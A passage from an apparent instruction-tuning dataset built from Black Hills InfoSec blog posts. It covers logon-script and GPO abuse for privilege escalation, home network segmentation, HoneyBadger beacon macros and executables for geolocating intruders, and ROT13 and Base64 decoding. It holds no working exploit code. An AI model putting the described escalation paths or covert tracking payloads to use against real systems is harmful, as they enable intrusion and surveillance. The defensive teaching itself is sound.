locations for the ability to write to the files If write access is allowed the attacker can use the script to attack anyone to which the logon script has been prescribed Where write access is not allowed the attacker can trace execution to determine whether additional scripts or binaries are called by the initial script and evaluate NTFS permissions in those locations As a result the organization must periodically ensure that NTFS permissions set on domain login scripts and any branching locations are appropriately restricted Group Policy Modification In this case the attacker finds that their user account has permission to modify Group Policy Objects within the Group Policy hierarchy With the ability to modify policy the attacker has a number of options available to them One of those options is to deploy their own logon script policy In a recent engagement this yielded administrative access on all computers where the policy was applied BloodHound is an excellent way to identify attack paths in this manner When write access is identified on a GPO GenericWrite or GenericAll as a standard domain user the organization should audit to ensure that permissions are properly restricted Furthermore the organization should periodically audit permissions on all Group Policy Objects to ensure that permissions are correct User Object Attribute Modification A similar condition arises when the attacker has control of a user with the ability to modify attributes of objects within the Active Directory schema In the context of this post the object type would be users This vector is similar to the previous one However instead of modifying a Group Policy Object the attacker simply modifies the ScriptPath attribute on the writable user account The default location of logon scripts is the SYSVOL Scripts folder However this attribute will also happily accept any valid UNC path As a result the attacker can update the attribute to point to a writable share where a malicious script can be planted This is another area BloodHound can help identify issues that might allow privilege escalation within the environment A path exhibiting this condition would show GenericWrite or GenericAll between a user or group node and another user To catalog and audit all Active Directory delegated permissions within your environment you can use the PowerShell script below published by Netwrix aw.githubusercontent.com thephoton activedirectory-delegation-searcher master search.ps1 Conclusion The ability to automatically execute scripts or commands during session initialization is a very powerful feature that decreases administrative burden on IT staff However an attacker who stumbles on an opportunity to abuse one of the techniques described above may have a significant opportunity to escalate privilege move laterally and persist within the environment Knowing this organizations need to pay very close attention to configuration changes within the environment and ensure that in-place protections are catching common abuses"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Home Network Design - Part 2</title>\n<taxonomies>Author, Ethan Robish, How-To, Informational, InfoSec 101, ethan robish, home network</taxonomies>\n<creation_date>Wed, 15 Apr 2020 12:04:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish Why Segment Your Network Here's a quick recap from Part 1 A typical home network is flat This means that all devices are connected to the same router and are on the same subnet Each device can communicate with every other with no restrictions at the network level This network's first line of defense is a consumer router 1 2 It also has your smart doorbell 3 door lock 4 5 6 lightbulb 7 and all your other IoT devices 8 9 Not to mention all your PCs tablets and smartphones which you of course keep patched with the latest security updates 10 right Windows 7 is now unsupported and most mobile devices only receive 2-3 years of OS and security updates at the most What about devices brought over by guests Do you make sure those are all up to date as well Once an attacker has a foothold on your network how hard would it be for them to spread to your other devices Many router vulnerabilities are available for an attacker to exploit from inside the router's firewall Your router is the gateway for all your other devices internet traffic opening you up to rogue DNS rogue routes or even TLS stripping man-in-the-middle attacks Some of the most devastating ransomware attacks 11 have spread by exploiting vulnerabilities in services like SMB or through password authentication to accessible systems on the same network segment Speaking of passwords yours are all at least 15 characters preferably random right 12 Ransomware is also known to try default or common passwords and even attempt brute forcing 13 You might as well make sure that you have multi-factor authentication enabled where you can because malware can also steal passwords from your browser and email 14 1 hreatpost.com threatlist-83-of-routers-contain-vulnerable-code 137966 2 outersecurity.org bugs.php 3 hreatpost.com ring-plagued-security-issues-hacks 151263 4 ww.cnet.com news smart-lock-has-a-security-vulnerability-that-leaves-homes-open-for-attacks 5 echcrunch.com 2019 07 02 smart-home-hub-flaws-unlock-doors 6 hreatpost.com smart-lock-turns-out-to-be-not-so-smart-or-secure 146091 7 ww.theverge.com 2020 2 5 21123491 philips-hue-bulb-hack-hub-firmware-patch-update 8 hreatpost.com half-iot-devices-vulnerable-severe-attacks 153609 9 hreatpost.com ?s iot 10 ww.it.ucla.edu security resources security-best-practices top-10-it-security-recommendations 11 ww.wired.com story notpetya-cyberattack-ukraine-russia-code-crashed-the-world 12 ww.blackhillsinfosec.com ?s password 13 ww.zdnet.com article ransomware-attacks-weak-passwords-are-now-your-biggest-risk 14 ww.zdnet.com article ftcode-ransomware-is-now-armed-with-browser-email-password-stealing-features Segmentation means separating your devices so that they cannot freely communicate with each other This may be completely isolating them or only allowing certain traffic but blocking everything else How does segmentation help combat the issues outlined above The first thing to realize is that no one is perfect Even if you are security conscious and actively work to fix issues there are always going to be security vulnerabilities and weaknesses You may be running IoT devices that you have no control over whether the manufacturer patches security issues You may own mobile devices that no longer receive updates You may have devices with default passwords set simply because you didn't realize there was a default account added Once we realize that we can't be perfect the idea of having different layers of security and practicing defense in depth starts making sense n.wikipedia.org wiki Defense_in_depth_ computing You likely already have some layers implemented Your edge firewall on your home router keeps random inbound traffic out Your personal devices may have software firewalls activated Your devices may have authentication enforced to prevent anonymous usage You could have anti-virus software that keeps common and known malware from infecting your system Each of these layers is fallible but adding more layers makes it harder and harder for an attacker to craft an exploit path that bypasses all of them They can also limit the damage should one layer be compromised For instance say an attacker somehow broke through your edge firewall Your security layers could prevent or delay further compromise into other devices Network segmentation is an excellent layer to add to your defense in depth strategy Approaches To Network Segmentation You can think of segmentation on a linear scale On one end of the scale every device is on the same network This is the same as no segmentation but everything is interoperable including malware You don't need instructions on setting this up because it is the default in every networking device on the planet This is like a bowl of candy where every piece can freely move around and touch all the others On the other end of the scale every device is completely isolated from each other This is similar to giving every device a public IP address and making it available on the internet This isn't as crazy as it sounds as IPv6 makes this completely possible and it forces you to treat everything as untrusted Everything has firewall rules only allowing certain services to be accessed The services that are accessible enforce authentication and encryption likely SSO and TLS This is similar to a box of chocolate where every piece is isolated from the others Notably Google has implemented this in what they call BeyondCorp loud.google.com beyondcorp ecurity.googleblog.com 2019 06 how-google-adopted-beyondcorp.html henewstack.io beyondcorp-google-ditched-virtual-private-networking-internal-applications Google's BeyondCorp has research papers for guidance and solutions to craft your own implementation provided you use Google's cloud for everything Cloudflare created a product that operates on a similar idea but can be used anywhere rather than requiring you to migrate everything into a cloud environment This is a paid product but the free tier may well work for home networks log.cloudflare.com introducing-cloudflare-access log.cloudflare.com cloudflare-access-now-teams-of-any-size-can-turn-off-their-vpn eams.cloudflare.com access index.html As I mentioned network segmentation is a scale This post will fall somewhere in the middle between these extremes Keeping with the candy analogies our goal is to group similar pieces together into separate containers The challenge is to determine the best balance between simplicity interoperability and security for you Network Segmentation Concepts In order to get segmentation you need your packets to traverse a device that can apply some sort of filtering Much of my confusion when setting up my own network stemmed from the fact that this happens at different layers of the OSI model with different concepts overlapping or working together If these concepts are new to you see the Terminology section of my previous posts ww.blackhillsinfosec.com home-network-design-part-1 Switch A managed switch can implement separate LAN segments through software configuration These are called virtual LANs or VLANs Managed switches can have rules that limit traffic between different ethernet ports These are called port Access Control Lists ACLs Layer 3 switches also have VLAN ACLs that filter traffic between VLANs VACLs These are basically limited firewall rules implemented in switches They aren't as flexible as software firewalls and only apply to OSI layers 3 and below but they have the benefit of better performance compared to a firewall outu.be oo-hejIq3iQ?t 11 Router Routers must have routes configured either automatically through a route discovery protocol or statically set Routes are used in order to allow IP traffic to pass between different network subnets Conversely if a route is not present then no traffic will flow between those subnets You might be tempted to call this a security feature and use it as such but I advise against that Routers will often automatically create routes between networks and there are entire protocols devoted to learning and sharing routes between routers e.g OSPF EIGRP RIP If you rely on the absence of a rule for security you might find your router has betrayed you by adding it for you and breaking your deliberate segmentation Firewall This is the most flexible of all the options and can operate on OSI layers 3 through 7 But in most networks this means that packets will have to pass through both switch hardware and routing hardware before making it to a CPU which applies the firewall filtering Switches have specialized hardware and process packets extremely quickly Any time a packet can't be handled by a switch alone it will add extra resource load on the next device and add extra latency Without the decisions made by switches a firewall's CPU could easily become overloaded on a large network Even a single physical device that functions as a switch router and firewall all wrapped up in one will most likely have specialized hardware inside for switching As a wise uncle once said This doesn't even cover all the available options In addition there is wireless client isolation virtual routing and forwarding VRF and along with others that I don't even know about Finding the right combination of these concepts is a balance between your configuration needs your available equipment and your throughput requirements What I have above should get you through this post but if you are interested here are some further resources eek-university.com ccna cisco-ccna-online-course ww.firewall.cx networking-topics.html ww.paloaltonetworks.com cyberpedia what-is-network-segmentation n.wikipedia.org wiki Network_segmentation ww.linfo.org network_segment.html ww.cyber.gov.au publications implementing-network-segmentation-and-segregation Deciding What To Put In Each Segment Devices on the same network segment will be able to talk to each other freely with no network firewall restrictions or potentially only the ACLs which your managed switch can enforce Additionally broadcast and multicast traffic will be available to all the devices on the segment Whereas devices on different segments can talk to each other using unicast traffic within the bounds of router routes and firewall rules If you are security-minded a likely assumption since you're reading this blog then you might be tempted to isolate each of your devices and open firewall rules one by one as needed Or to create a multitude of segments with a few devices in each This is a decent approach if you have the resources and time to dedicate to this But I'll give you the benefit of my experience as to why I think simpler is better As you get more complex you increase the setup and maintenance burden Not only does this take more time and energy but you also run the risk of losing the security benefits you were after due to creating something more complex than what you currently understand There is a reason this post is written in 2020 while part one of this series was in 2017 After I wrote part one I grouped my 21 devices into 10 different types created a spreadsheet and assigned them into 8 segments Even then I realized this was too many and ended up implementing 6 segments I spent too much time trying to get devices to work together pruning and merging certain segments over time in frustration The final straw was after I had visitors connected to my guest wireless network and noticed that the dynamic IP addresses they had gotten didn't look right I investigated and discovered that somewhere along the way I had completely blown the separation I thought I had between my home devices and guest devices At this point I decided to tear everything down and start from scratch to build something up that I could fully understand rather than trying to patch up a design that was overly complex to begin with Segmentation Approaches I came up with two ways to approach network segmentation Top-Down Go from one segment to two then three etc by thinking about all my devices and deciding which ones I cared most about and wanted to separate from everything else This could simply be wanting all your own devices separate from your guests devices Or it could be wanting your personal computers separate from your media and IoT devices Bottom-Up Start with every device separate and think about how to group them together based on similar resource access requirements You will likely find a hybrid of the two approaches most useful At the end of the top-down approach you can use the bottom-approach to continue splitting up your biggest groups and help develop firewall rules And if you start with the bottom-up approach you will still likely want to make some high-level group decisions like splitting off your work and guest segments The primary reason we are implementing network segmentation is for security It is easy to get lost in the weeds so one piece of advice is to keep the end goal of compartmentalizing services and data in mind Top-Down Approach Start with all of your devices in one group and identify groups to break out based on your needs It is called top-down because you are going from general one group to specific multiple groups This is the approach I took most recently and ended up with a network that was simpler to configure and simpler to manage I recommend taking this approach to start with List out all client devices Decide which devices you'll need to segment at a minimum For instance work devices and guest devices must be on their own segments Group your devices under each category Work Guest Home You can start with these segments or you can divide them up further if you can easily identify additional groups of devices For instance you might decide that you have several Home devices that only need internet access and nothing else You could choose to connect these to your Guest segment or you could create a separate segment called Internet Only This approach is meant for simplicity and if you start getting too granular you will benefit from reading through the considerations needed for the bottom-up approach Example Let's walk through a real-world example where the primary goals are to separate work devices from home devices and provide a guest network You can do this a number of ways I'll use a spreadsheet but you can use pen and paper lists in a document or a kanban e.g Trello board List out all client devices in the first column In the first row create a new column for each of your must-have segments e.g Work Guest Mark your devices in each segment DeviceHomeWorkGuestNASxDesktopxThinkPadxMacBook 13 xMacBook 15 xSurfacexiPhone 8xPixel 3xGalaxy S4xiPhone SExKindle FirexXbox OnexShield TVxBrother PrinterxHD HomeRunx In this case I'm reserving the Guest group for anyone who visits my house and brings a phone or laptop of their own If I get any additional work devices in the future those will also go in the Workgroup I could take this further if I wanted to Let's say that some of my devices don't need access to anything local and that they only ever talk to the internet I've also decided to put my home server into its own group DeviceHomeWorkServerInternet OnlyGuestNASxDesktopxThinkPadxMacBook 13 xMacBook 15 xSurfacexiPhone 8xPixel 3xGalaxy S4xiPhone SExKindle FirexXbox OnexAndroid TVxBrother PrinterxHD HomeRunx Remember that we have several tools at our disposal to limit traffic VLANs Port ACLs Wireless Isolation Firewall Rules If I keep this in mind I can start seeing that I'll need to put in firewall rules to allow each group access to certain services on my home server While I could consider connecting my Internet Only devices to my Guest network and implement wireless client isolation I would prefer to keep them separate Sharing the network password with other devices introduces a risk of eavesdropping Furthermore Windows 10 has been known to share wireless credentials with the user's contact list meaning your guest wireless network key could make it into the hands of your friends friends who you do not know Bottom-Up Approach Start with each of your devices in its own group You will have as many groups as you have devices Then start grouping devices together based on specific needs until you can no longer justify merging groups together I took the bottom-up approach during my first attempt at segmenting my network My advice if you decide to take this approach is Be honest about the skills you have and the amount of time and frustration you are willing to put up with in order to learn what you don't know Keep grouping an extra step and decide which device groups you would merge together next This can save you some trouble if you run into unexpected issues You may even decide that you like the groups you end up with here better and use them My steps for the bottom-up approach are List out all client devices Mark devices which will run a server that needs to be accessed by other devices Mark devices for which local auto-discovery is necessary to function If you have the option of inputting the IP address manually in your application and are willing to do that there's no need to have the auto-discovery features For each device you identified as a server go through all your other devices and determine which ones will need access For each device you identified with auto-discovery go through all your other devices and determine which ones need to auto-discover it A Quick Note About Service Discovery And Multicast DNS Printers Chromecasts and home automation devices often use multicast traffic to perform service auto-discovery specifically multicast DNS mDNS though other multicast-based protocols are sometimes used Multicast traffic does not cross network segments technically broadcast domains without extra configuration IGMP and the multicast used by mDNS requires a repeater service in order to cross network segments For example I have a network TV tuner that requires an app to connect and watch TV The app will automatically detect the tuner with no way to manually enter its IP address It relies on multicast traffic which means I have to keep it on the same network as all the devices I expect to use it with Other examples of devices you might run into are screen mirroring e.g Chromecast speakers e.g Sonos file shares e.g Apple Time Capsule and printing Some devices may appear to use auto-discovery but in reality use a cloud service to facilitate discovery and management If you're not sure if your device relies on local auto-discovery disconnect your home's internet connection and try to locate the device in your client application you may have to remove it first if it was already saved If it finds it and can connect there's a good chance it is using some form of auto-discovery You can also fire up Wireshark and look for mDNS packets filter mdns or use a tool that speaks mDNS to query for services on your network In this post I am choosing the simpler route that requires multicast devices to be on the same network segment but at the end are some options if you'd like to research a different solution for your specific network setup Example You can skip this approach if you're happy with the top-down exercise But the bottom-up approach can help you create further segmentation and gain a more intimate knowledge of your network devices and services and how they interact which will help you when it comes time to create firewall rules Again I'll use a spreadsheet but you can do this with pen and paper lists in a document or a kanban e.g Trello board List out all client devices in the first column Also create an empty Server column and an empty Auto-Discovery column Mark all your devices in the Server column which are hosting services that your other devices will need to access For all your servers mark in the Auto-discovery column where auto-discovery functionality is required DeviceServerAuto-discoveryNASxDesktopThinkPadMacBook 13 MacBook 15 SurfaceiPhone 8Pixel 3Galaxy S4iPhone SEKindle FireXbox OneShield TVxxBrother PrinterxHD HomeRunxx In this case I have 4 devices which are classified as servers on my home network Of these only 2 have auto-discovery as a mandatory feature Auto-discovery would be nice for adding printers but considering I can manually add the location of a printer and once it's set up I don't have to worry about it again I'm fine neutering the auto-discovery feature Next we're going to expand our table For every server you marked make a new column for each service that needs to run Pay attention here as you might have multiple services hosted on the same system For instance my NAS hosts a media server a fileshare and a DNS server from the same server so I will make a new column for each of these services For any services which require auto-discovery mark the column with auto Here's what the table looks like now DeviceServerAuto-DiscoveryMediaFileshareDNSPrintingTV Tuner auto Casting auto NASxDesktopThinkPadMacBook 13 MacBook 15 SurfaceiPhone 8Pixel 3Galaxy S4iPhone SEKindle FireXbox OneShield TVxxBrother PrinterxHD HomeRunxx Next go through each service and mark which devices will require access to that service I used dashes to indicate the server hosting the service DeviceMediaFileshareDNSPrintingTV Tuner auto Casting auto NAS---DesktopxxThinkPadxxMacBook 13 xxxxxMacBook 15 xxxxxxSurfacexxxxxiPhone 8xxxxPixel 3xxxGalaxy S4xxiPhone SExxKindle FirexxxXbox OnexxxShield TVxxx-Brother Printerxx-HD HomeRunx We won't necessarily use all these columns to determine what groups to put systems in But they will come in handy when creating firewall rules later The columns we do care about are the auto-discovery services since those will need to be on the same segment to function correctly Unless you use an mDNS repeater described earlier in this article then any rows with marks in multiple auto-discovery columns means those services will have to be on the same segment Here's what I mean from the table above Even though there are several devices that only need access to one of the services and not the other the orange highlighted devices MacBook 15 Surface iPhone 8 need access to both services requiring auto-discovery This means that the TV Tuner and Casting services served by the Shield TV and HD HomeRun will need to be on the same network segment along with those client devices And that means that any other device that needs access to only one of those services will be on that segment as well In the event that you have some auto-discovery services that do not have overlapping clients congratulations You can put these each in their own network segments and keep their respective clients isolated from each other At this point we have one network segment for sure that contains all the aforementioned auto-discovery related devices Since every other service required is unicast we could technically put each of the remaining devices in their own isolated segment and simply manage routes and firewall rules between each of them This would offer the greatest security in theory But in practice this is likely too complex and time-consuming to be worth it This is why I advised to keep going an extra step and see which devices make sense to group together next In the table below you can see how I've rearranged and grouped devices based on similarities in services they require access to This would simplify firewall configuration as instead of having to require rules for individual devices I could instead configure firewall rules for an entire segment and any devices in that segment which require access to a certain service goes in that segment For example below I could have a Fileshare segment and a separate Media segment and configure the firewall rules accordingly While this is a good exercise to inform firewall rules it would be a mistake to stop here Looking at my groups I can see that I still need to have my ThinkPad work machine isolated which means it can't go on the same segment as the Desktop and Printer Furthermore I think I'd like to have the printer isolated in its own segment Printers aren't known for having the best security and by putting in a segment by itself I could implement firewall rules that let all other segments reach into the print spooling port but prevent the printer from reaching out to any of my other devices save for the DNS and Fileshare services it needs On the other hand I'm just fine with putting the Galaxy S4 and iPhone SE together in the same segment and creating separate segments for each of them would be overkill Accessing Services Across Segments There are a number of reasons you may want to allow devices to communicate across segments One scenario is having a separate guest network but you still want to give them access to specific services on a different segment First a warning you don't know if the devices your guests bring over are already infected with malware or what they will do once connected to your network Letting them connect to any of your own devices is a risk That said here are some options for dealing with these issues Just say no Apologize and tell your guests that printing casting etc doesn't work from your guest network Add firewall rules that allow"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With Tracking Hackers With HoneyBadger</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, John Strand, Red Team, Red Team Tools, HoneyBadger</taxonomies>\n<creation_date>Mon, 20 Apr 2020 12:07:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be wsHDC1LD8_w Hello and welcome My name is John Strand and in this video we're going to talk a little bit about HoneyBadger Now in a number of other videos and a number of other things whenever you're talking about attribution or cyber deception you can focus on creating documents or elements that'll beacon back and many times you can collect the IP address that's making the beacon That's okay but IP address geolocation isn't all that hot but we can do better and we have a specific tool that was created by our very own Bradley at Black Hills Information Security building on the work of Tim Tomes or lanmaster53 Hopefully these two will be merged in the very near future called HoneyBadger Now if we jump right in HoneyBadger is on the ADHD installation and once again if you want ADHD you can go to activecountermeasures.com You can go to our free tools check out our projects and you'll see ADHD there This is of course the distribution that I use for Wild West Hackin Fest classes and also at Black Hat so check it out All of the instructions once you get ADHD set up are on the desktop in a file called ADHD Usage Once you have opened up that document you would select Attribution and then you would select HoneyBadger Now once you're in the HoneyBadger instructions it goes into a lot of detail about how to set up HoneyBadger how to configure HoneyBadger One of the big gotchas is you do need a Google API Key in order to make the map function work in HoneyBadger Let's talk a little bit about what this actually does Well what it's doing is a wireless site survey Here I have a USB wireless adapter that I got off the Hak5 shop Great stuff over there With this USB wireless adapter I can do a survey of all of the wireless networks Now you don't need a USB wireless adapter for HoneyBadger to work That's not quite what I'm saying but your computer system has the ability to see all of the wireless networks around it This is something you see every time you open up your phone looking for a wireless hotspot or your computer That's because these access points are beaconing out about 10 times per second announcing their BSSID and their ESSID The BSSID is the MAC address the media access control address for the access point The ESSID is the actual access point name What HoneyBadger does is causes the attacker's computer system to do a wireless site survey give us those SSIDs BSSIDs and ESSIDs and then it queries Google's API for geolocation and Google responds back Let's actually take a look at the interface of HoneyBadger and some of the things that you would see there First whenever you're setting up HoneyBadger you would set up targets Now the idea of a target is so that you can set up different campaigns that are identifiable from each other I have demo I have class I have demo I have Class I have Spearfish and they have different guids This is important because if I set multiple different HoneyBadger elements I want to be able to differentiate from them I can put in an Excel spreadsheet I can put it on a website I can put it in a variety of different places and that distinction is important Also on this slide you can generate a raw macro Whenever I click the macro button it actually takes me to the macro that you'd put into an Excel spreadsheet or if you're really desperate a Word document I tend not to use this technology much in Word documents because everybody knows not to run any macros that show up in Word documents What this does is a PowerShell command where it does a wireless site survey of all of the different wireless networks that are around That's the macro We also have the capability of kicking out VB.NET code With the VB.NET code we can actually convert this to a standalone executable with something like vbc and Mono This is all in the class and it's also in the instructions but basically you would install Mono start the Mono shell as an administrator I can actually show you what that looks like here I can basically go down to the start button and type Mono Then when it says the Mono command prompt I right-click and run it as administrator Then I would use vbc to actually convert that code the macro.vb into an executable and actually convert it down to an executable Then when you run it it'll do the geolocation Now that executable gives us tremendous flexibility to move it into a wide variety of different other formats We can convert it and merge it with other executables like VPNs things of that nature and then we can get some really good geolocation on an attacker Now once I'm in ADHD I want to show you what the maps look like and give you an idea of the accuracy If I click the map tab these are all of the times that I've actually fired it off and I'll go over here to Las Vegas the last time I ran this class at Black Hat I went too far a land where I cannot return from Let's see I'm in Tuba City so Grand Canyon National Park Flagstaff let's go back down into my little arrow Here we go Let's zoom into Las Vegas and on top of the Mandalay Bay and give you an idea of just how accurate this thing can be whenever you fire it up Now this is the executable The macro if you put it inside of an Excel spreadsheet would be also really really hyper-accurate but it really depends on a number of things If they actually are on a wireless network you can pull that up Here you can see that it's the Mandalay Bay and if I switch it over to satellite you're going to see right exactly where we were in the conference center the last time I actually fired this off That's kind of cool HoneyBadger is designed for extreme levels of attribution This is using macros or VB code to actually do that Now with that in mind also remember you're just getting the attacker's system to give the wireless networks that are around it If I click on the log and I scroll all the way down to the bottom of the logs here you can see what it looks like whenever you're actually querying that data It actually pulls all of the wireless access points Here you can see Black Hat and then the BSSIDs and then it submits that data to Google Now when Google receives that data through the API that Google uses on your phone all of the time Google will respond back with the latitude here it'll respond back with the longitude here and it'll also give you the overall accuracy in meters Sometimes it's around a hundred meters sometimes you get lucky and it's down to 20 meters This is extreme levels of attribution Now is there a question as to the legalities of this Well if you look at what we're doing the attacker would have to break into your environment steal something and then it would trigger That's kind of dubious they'd actually press charges in that situation Further we're using the same API that your phone is using hundreds of times per minute every single day With that in mind it becomes a little bit easier for us to use these technologies as defenders I hope you enjoyed this video Be sure to check out more videos Be sure to check out the class at Wild West Hackin Fest in San Diego and in Deadwood and I hope to see you on Wednesdays with Enterprise Security Weekly with Paul Matt and myself Take care and I'll see you in another video"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With ROT Obfuscation</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, John Strand, Red Team, john strand</taxonomies>\n<creation_date>Wed, 22 Apr 2020 16:38:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be Xb52oX1wsn0 Hello my name is John Strand In this video we're going to be talking about ROT or rotate Why exactly are we talking about one specific thing Well this particular video is used with our Cyber Range that we're establishing at Black Hills Information Security and it's very common when you're pentesting or you're doing any type of cyber range activity or capture the flag to encounter a variety of different types of encoding and ROT is just one of them Specifically we're going to talk about ROT 13 You can also see ROT 47 but we're going to be talking a little bit about ROT 13 to kick it off Now whenever you're looking at ROT it means rotate This is a variation of the Caesar Cipher where you could say R1 or rotate one that means an A becomes a B R2 would be an A becomes a C and so on So you're basically rotating the characters Now the way that this used to work with the Caesar Cipher is you'd wrap it around a pole and the rotation would actually line up on the pole itself But we can actually do that with computers Now why in the hell would anybody ever do this Well it actually became a very popular thing back in the '80s on various Usenet groups basically bullet boards And what was going on was you would have jokes or you would have text and you would want to obscure the punchline So somebody would read the setup for the joke and then the punchline would be like ROT encoded Then you could basically decode it get the punchline And that would be funny It was also kind of the equivalent of magazines like MAD magazine would have a quiz and then you would turn it upside down and you would see it So that was kind of the way that they actually utilized it So originally it was set up as just a joke And that works I guess But okay so things were different back then whenever it came to humor But whenever we're looking at ROT and various variations of ROT you're actually still seeing it being used in some applications Now this is never a good idea ever Just don't ever allow your developers to use things like ROT But as a security professional you got to be able to understand when you see it how to be able to identify it quickly and then eradicate it like you would a termite or roach someplace So if we're going to play around with ROT we're going to be using the TR translate command on Linux to actually do this I'm going to just take a basic bit of text and I'm just going to echo it through So I'm going to echo I am sure there's a better way to do this and then we're going to pipe it through TR What you're seeing with that TR command is we're basically saying translate and shift We have capital A to capital Z lowercase A to lowercase Z and then it's going to translate that to an N And that means N is going to be the starting character So if you go A B C D E F G H I J K L M N that's 13 So it's going to rotate it over So it's basically going to turn this text that I have I am sure there's a better way to do this and we're going to translate it And whenever I hit enter you can see that it's converted it over to jibberish If you play that backward it brings your dogs and cats back to life So that's a really easy way to try to shift that Of course you can reverse it to try to get it down into normal text that we would be able to read a little bit easier So the whole point of all of this is whenever you're dealing with capture the flags or any of these different challenges that are online you're going to come up with ROT It's going to be something you're going to run into It's kind of an inside joke from years back However there have been situations where we have actually seen this used in an application to obfuscate things like passwords Now trust me there's far better ways to obfuscate passwords but if you're a developer fresh out of community college and you've got to do some security and you don't understand security at all this seems like a quick and easy way to try to obfuscate So some of the dead giveaways are the spacing and the lines themselves If you have V N Z So V most of the English language is going to be multiple letters So you would focus in on translating a V to like an I or a V to an A and so on and then counting that offset and then doing that offset shift back to see if you can get it into something that's more useful Now there's other versions of ROT If you start seeing special characters being used you might be using something or encountering something like ROT 47 or ROT 40 or some other variation that can use higher value ASCII characters That means that they're actually rotating through the special characters as well If you get that you'll just have to play around with the different types of ROT encodings to play with it but usually most CTFs they don't go off the main ones that are normally used So I hope you like this video Once again this is being used with the BHIS Cyber Range You'll see other ones pop up for things like BASE64 encoding and using hex editors and things of that nature So thank you so much and I hope to see you in a new video sometime soon"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting Started With Base64 Encoding and Decoding</title>\n<taxonomies>Author, How-To, Informational, John Strand, Base64</taxonomies>\n<creation_date>Wed, 29 Apr 2020 13:15:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be TzG_iflIiig Hello and welcome My name is John Strand and in this video we're going to be talking about Base64 encoding and decoding Now the reason why we're talking about it is once again we have the BHIS Cyber Range for our customers and friends and this is just basically a video to walk people through some of the challenges that utilize Base64 Now the reason why Base64 actually exists is kind of interesting Whenever you are transferring binary data or you're transferring data with special characters it can be encoded and it can be garbled especially whenever you're dealing with protocols that are designed predominantly for sending text For example if you're looking at something like HTTP transports a lot of text and if we start sending binary we might get into trouble In fact we see this all the time especially with attacks like SQL where semi-colons get interpreted and get executed This is why protocols like this exist or different encoding formats like this exist It allows you to convert things like binary and special character data into something that's far less benign like upper lower case and numbers and that's what we actually get whenever we're utilizing Base64 as an encoding mechanism You'll see it all the time whenever you're doing web application security assessments looking at security parameters and tokens and things of that nature Let's play around a little bit with encoding and decoding Base64 and then some of the little challenges that you're going to run into Now in my example that I have up on my screen we're going to be playing around with I am sure there's a better way to do this434343 or capital C capital C capital C in hex but we're not at that video yet And we're going to pipe it through Base64 And that's going to encode it As you can see we have the I am sure and the space and all that has been replaced with what looks like gibberish but it's pretty much not malicious gibberish or mostly not malicious gibberish I suppose It allows it to encode it in a way that it's easily transferred over clear text or plain text protocols Now one of the things you'll notice is sometimes with Base64 or a lot of the times it will end with equals equals and that has to do with padding If your character set that's coming in doesn't land perfectly on the boundaries that Base64 is looking for it'll actually pad it Many times a telltale giveaway are the equal signs at the end one or two Now sometimes there won't be any That will happen That means the text landed on a perfect boundary and that's okay but it's just something to look for It's a quick and dirty trick Now if we actually want to decode Base64 encoded data we can in fact do that Let me bounce out here and I'm just going to use straight-up Base64 decode Now I utilized a switch here you can see I did the --decode switch And now whenever I hit enter it's going to try to decode it and it's going to freak out You can see right here it says I'm sure there is a and then it goes ahh Base64 invalid input The reason why is I snuck in a couple of special characters in the middle of the Base64 encoded string Now why would anybody ever do that Well a lot of malware actually uses Base64 The reason why is very slight changes can actually alter signatures in a much more significant way whenever you're doing signature pattern matching within an executable What some crafty attackers will do is they'll actually slip special characters in their Base64 encoded stream And in doing that any type of firewall or IDS that's using deep packet inspection to analyze that Base64 encoded data will start throwing errors Basically be like mmm there's something wrong here Now if you're dealing with a string that has Base64 and it throws in some special characters you can throw in the -i switch and with the -i switched does is it tells Base64 ignore garbage You're going to decode this Base64 encoded string And if you come across something that you don't quite understand just don't worry Ignore it Pretend it never existed Pretend that it never happened And as you can see it actually cleans up the output substantially in doing that Once again this is used in the Black Hills Information Security Cyber Range and if you like it for Base64 encoding and decoding data thank you Check us out every single Wednesday on Enterprise Security Weekly and be sure to hit the subscribe button down below We do tons of videos and tons of free education and webcasts at Black Hills InfoSec and I hope to see you on one of our videos or webcasts in the very near future Thank you so much and take care"
    },
    {
        "input": "",
